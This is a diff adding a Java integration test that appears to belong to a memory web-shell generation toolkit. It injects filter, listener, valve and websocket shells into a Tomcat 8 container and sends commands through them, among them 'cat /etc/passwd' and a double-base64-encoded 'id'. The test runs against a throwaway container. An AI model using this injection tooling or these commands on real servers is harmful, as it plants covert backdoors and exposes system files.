@@ -1,0 +1,134 @@
+package com.reajason.javaweb.integration.memshell.tomcat;
+
+import com.reajason.javaweb.Server;
+import com.reajason.javaweb.integration.ShellAssertion;
+import com.reajason.javaweb.memshell.MemShellResult;
+import com.reajason.javaweb.memshell.ShellTool;
+import com.reajason.javaweb.memshell.ShellType;
+import com.reajason.javaweb.memshell.config.CommandConfig;
+import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.packer.Packers;
+import lombok.SneakyThrows;
+import lombok.extern.slf4j.Slf4j;
+import net.bytebuddy.jar.asm.Opcodes;
+import okhttp3.HttpUrl;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+import org.apache.commons.lang3.RandomStringUtils;
+import org.apache.commons.lang3.tuple.Pair;
+import org.junit.jupiter.api.AfterAll;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.Arguments;
+import org.junit.jupiter.params.provider.MethodSource;
+import org.junit.jupiter.params.provider.ValueSource;
+import org.testcontainers.containers.GenericContainer;
+import org.testcontainers.containers.wait.strategy.Wait;
+import org.testcontainers.junit.jupiter.Container;
+import org.testcontainers.junit.jupiter.Testcontainers;
+
+import java.util.Base64;
+import java.util.Objects;
+import java.util.stream.Stream;
+
+import static com.reajason.javaweb.integration.ContainerTool.getUrl;
+import static com.reajason.javaweb.integration.ContainerTool.warFile;
+import static com.reajason.javaweb.integration.DoesNotContainExceptionMatcher.doesNotContainException;
+import static org.hamcrest.MatcherAssert.assertThat;
+import static org.junit.jupiter.api.Assertions.assertTrue;
+import static org.junit.jupiter.params.provider.Arguments.arguments;
+
+/**
+ * @author ReaJason
+ * @since 2025/4/28
+ */
+@Testcontainers
+@Slf4j
+public class Tomcat8CommandEncryptorContainerTest {
+    public static final String imageName = "tomcat:8-jre8";
+
+    @Container
+    public final static GenericContainer<?> container = new GenericContainer<>(imageName)
+            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
+            .waitingFor(Wait.forHttp("/app"))
+            .withExposedPorts(8080);
+
+    static Stream<Arguments> casesProvider() {
+        return Stream.of(
+                arguments(imageName, ShellType.FILTER, ShellTool.Command, Packers.JSP),
+                arguments(imageName, ShellType.LISTENER, ShellTool.Command, Packers.JSP),
+                arguments(imageName, ShellType.VALVE, ShellTool.Command, Packers.JSP),
+                arguments(imageName, ShellType.PROXY_VALVE, ShellTool.Command, Packers.JSP),
+                arguments(imageName, ShellType.WEBSOCKET, ShellTool.Command, Packers.JSP)
+        );
+    }
+
+    @ParameterizedTest
+    @SneakyThrows
+    @ValueSource(strings = {
+            "/bin/bash -c \"{command}\" 2>&1",
+            "sh -c \"{command}\" 2>&1",
+            "{command}"
+    })
+    void testTemplate(String template) {
+        String url = getUrl(container);
+        String shellTool = ShellTool.Command;
+        String shellType = ShellType.FILTER;
+        Packers packer = Packers.BigInteger;
+        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
+        String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
+        ShellToolConfig shellToolConfig = CommandConfig.builder()
+                .paramName(uniqueName)
+                .template(template)
+                .build();
+        MemShellResult generateResult = ShellAssertion.generate(urlPattern, Server.Tomcat, null, shellType, shellTool, Opcodes.V1_8, shellToolConfig, packer);
+        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, container);
+        OkHttpClient okHttpClient = new OkHttpClient();
+        HttpUrl httpUrl = Objects.requireNonNull(HttpUrl.parse(shellUrl))
+                .newBuilder()
+                .addQueryParameter(uniqueName, "cat /etc/passwd")
+                .build();
+        Request request = new Request.Builder()
+                .url(httpUrl)
+                .get().build();
+
+        try (Response response = okHttpClient.newCall(request).execute()) {
+            String res = response.body().string();
+            System.out.println(res.trim());
+            assertTrue(res.contains("root:x:0:0:root:/root:/bin/bash"));
+        }
+    }
+
+    @AfterAll
+    static void tearDown() {
+        String logs = container.getLogs();
+        log.info(logs);
+        assertThat("Logs should not contain any exceptions", logs, doesNotContainException());
+    }
+
+    @ParameterizedTest(name = "{0}|{1}{2}|{3}")
+    @MethodSource("casesProvider")
+    void test(String imageName, String shellType, String shellTool, Packers packer) {
+        String url = getUrl(container);
+
+        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
+
+        String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
+
+        ShellToolConfig shellToolConfig = CommandConfig.builder()
+                .paramName(uniqueName)
+                .encryptor(CommandConfig.Encryptor.DOUBLE_BASE64)
+                .build();
+
+        MemShellResult generateResult = ShellAssertion.generate(urlPattern, Server.Tomcat, null, shellType, shellTool, Opcodes.V1_8, shellToolConfig, packer);
+
+        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, container);
+
+        String payload = Base64.getEncoder().encodeToString(Base64.getEncoder().encode("id".getBytes()));
+        ShellAssertion.commandIsOk(shellUrl, shellType, uniqueName, payload);
+    }
+}
